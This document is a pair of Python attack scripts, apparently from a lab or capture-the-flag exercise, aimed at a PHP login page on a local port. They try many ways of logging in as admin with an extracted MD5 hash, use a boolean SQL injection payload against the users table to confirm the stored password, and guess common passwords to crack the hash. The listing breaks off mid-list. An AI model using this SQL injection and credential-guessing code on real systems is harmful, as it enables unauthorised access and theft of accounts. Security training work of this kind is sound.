import time

base_url = "http://127.0.0.1:33038"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}
extracted_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Trying different form submission methods...")

# Test 1: Plain form data with submit button
data1 = {
    "username": "admin",
    "password": extracted_hash,
    "submit": "Login"
}
r1 = requests.post(f"{base_url}/index.php", data=data1, cookies=session_cookie, timeout=10)
print(f"[1] Standard form data: {r1.text}")

# Test 2: Without submit button
data2 = {
    "username": "admin",
    "password": extracted_hash
}
r2 = requests.post(f"{base_url}/index.php", data=data2, cookies=session_cookie, timeout=10)
print(f"[2] Without submit field: {r2.text}")

# Test 3: URL encoded form
r3 = requests.post(
    f"{base_url}/index.php", 
    data=f"username=admin&password={extracted_hash}&submit=Login",
    headers={'Content-Type': 'application/x-www-form-urlencoded'},
    cookies=session_cookie, 
    timeout=10
)
print(f"[3] Raw URL encoded body: {r3.text}")

# Test 4: Try the hash with all lowercase
r4 = requests.post(
    f"{base_url}/index.php", 
    data={"username": "admin", "password": extracted_hash.lower(), "submit": "Login"},
    cookies=session_cookie, 
    timeout=10
)
print(f"[4] Lowercase hash: {r4.text}")

# Test 5: Try the hash with all uppercase
r5 = requests.post(
    f"{base_url}/index.php", 
    data={"username": "admin", "password": extracted_hash.upper(), "submit": "Login"},
    cookies=session_cookie, 
    timeout=10
)
print(f"[5] Uppercase hash: {r5.text}")

# Let me check what the actual stored password is being checked against
print("\n[*] Testing if the password field in DB is actually the plaintext password...")

# Check if the password IS the hash with case variations
for pwd in [extracted_hash, extracted_hash.lower(), extracted_hash.upper()]:
    payload = f"' or (SELECT password FROM users WHERE username='admin')='{pwd}'-- -"
    data = {"username": payload, "password": "dummy", "submit": "Login"}
    r = requests.post(f"{base_url}/index.php", data=data, cookies=session_cookie, timeout=10)
    result = '{"response":"password"}' in r.text
    print(f"  Password = '{pwd[:20]}...': {'TRUE' if result else 'FALSE'}")
    if result:
        print(f"  [!] MATCH FOUND: The stored password is exactly '{pwd}'")

import requests
import hashlib
import time

base_url = "http://127.0.0.1:33038/index.php"
extracted_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Testing password inputs with various transformations...")

# The database stores '7d39307ae824e70052c0aa16816a9b16' as the password
# Let's check if the application compares MD5(hash) differently

def test_login(password):
    data = {
        "username": "admin",
        "password": password,
        "submit": "Login"
    }
    r = requests.post(base_url, data=data, timeout=10)
    return r.text

# Test 1: Raw hash
result = test_login(extracted_hash)
print(f"[1] Raw hash as password: {result}")

# Test 2: MD5 of the hash
hash_of_hash = hashlib.md5(extracted_hash.encode()).hexdigest()
result = test_login(hash_of_hash)
print(f"[2] MD5(hash) as password: {result}")

# Test 3: Try "admin"
result = test_login("admin")
print(f"[3] 'admin' as password: {result}")

# Test 4: Try "password"
result = test_login("password")
print(f"[4] 'password' as password: {result}")

# Test 5: Try empty string
result = test_login("")
print(f"[5] Empty password: {result}")

# Test 6: Try hash reversed
reversed_hash = extracted_hash[::-1]
result = test_login(reversed_hash)
print(f"[6] Reversed hash as password: {result}")

# Test 7: SHA1 of something common
sha1_result = hashlib.sha1(b"admin").hexdigest()
result = test_login(sha1_result)
print(f"[7] SHA1('admin') as password: {result}")

# Test 8: MD5 common passwords
common_passwords = ["admin", "password", "123456", "qwerty", "admin123", "root", "toor", "12345678", "password123", "test", "guest"]
for pwd in common_passwords:
    md5_pwd = hashlib.md5(pwd.encode()).hexdigest()
    if md5_pwd == extracted_hash:
        print(f"[CRACKED] '{pwd}' -> MD5 = {md5_pwd}")
        result = test_login(pwd)
        print(f"    Login with '{pwd}': {result}")
        break
else:
    print("[*] Common passwords don't match the hash")

# The MD5 hash 7d39307ae824e70052c0aa16816a9b16 might be a hash of something
# Let's see if it decodes to something simple
print("\n[*] Let's try some things the hash might be:")
test_inputs = [
    "administrator",
    "admin_password",
    "secret",
    "P@ssw0rd",
    "Admin123",
    "changeme",
